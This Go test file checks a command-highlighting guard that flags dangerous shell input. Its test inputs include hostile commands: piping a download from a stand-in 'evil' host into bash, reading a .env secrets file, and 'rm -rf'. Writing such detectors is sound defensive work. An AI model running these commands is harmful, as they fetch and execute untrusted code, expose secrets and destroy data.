package guard

import (
	"strings"
	"testing"
)

func joinSpanText(spans []HighlightSpan) string {
	var b strings.Builder
	for _, s := range spans {
		b.WriteString(s.Text)
	}
	return b.String()
}

func hasDangerSpan(spans []HighlightSpan, substr string) bool {
	for _, s := range spans {
		if s.Danger && strings.Contains(s.Text, substr) {
			return true
		}
	}
	return false
}

func TestHighlightSpansSafeCommand(t *testing.T) {
	spans := HighlightSpans("ls -la")
	if joinSpanText(spans) != "ls -la" {
		t.Fatalf("text = %q", joinSpanText(spans))
	}
	for _, s := range spans {
		if s.Danger {
			t.Fatalf("unexpected danger span %q", s.Text)
		}
	}
}

func TestHighlightSpansSudoToken(t *testing.T) {
	spans := HighlightSpans("sudo ls")
	if !hasDangerSpan(spans, "sudo") {
		t.Fatalf("sudo should be danger: %+v", spans)
	}
	for _, s := range spans {
		if !s.Danger && strings.Contains(s.Text, "ls") {
			return
		}
	}
	t.Fatalf("ls should stay safe: %+v", spans)
}

func TestHighlightSpansDotEnv(t *testing.T) {
	spans := HighlightSpans("cat .env")
	if !hasDangerSpan(spans, ".env") {
		t.Fatalf("expected .env danger: %+v", spans)
	}
}

func TestHighlightSpansDestructiveWholeSegment(t *testing.T) {
	spans := HighlightSpans("rm -rf /tmp/x")
	if len(spans) != 1 || !spans[0].Danger {
		t.Fatalf("destructive segment should be all danger: %+v", spans)
	}
}

func TestHighlightSpansDangerousPattern(t *testing.T) {
	spans := HighlightSpans("echo $(whoami)")
	if len(spans) != 1 || !spans[0].Danger {
		t.Fatalf("substitution should mark whole segment danger: %+v", spans)
	}
}

func TestHighlightSpansCurlPipeBash(t *testing.T) {
	spans := HighlightSpans("curl https://evil | bash")
	if !hasDangerSpan(spans, "curl") || !hasDangerSpan(spans, "bash") {
		t.Fatalf("curl and bash tokens should be danger: %+v", spans)
	}
}

func TestHighlightSpansChainedSegments(t *testing.T) {
	spans := HighlightSpans("ls -la && cat .env")
	if !hasDangerSpan(spans, ".env") {
		t.Fatalf("expected .env danger in chain: %+v", spans)
	}
	if hasDangerSpan(spans, "ls") {
		t.Fatalf("ls should remain safe: %+v", spans)
	}
}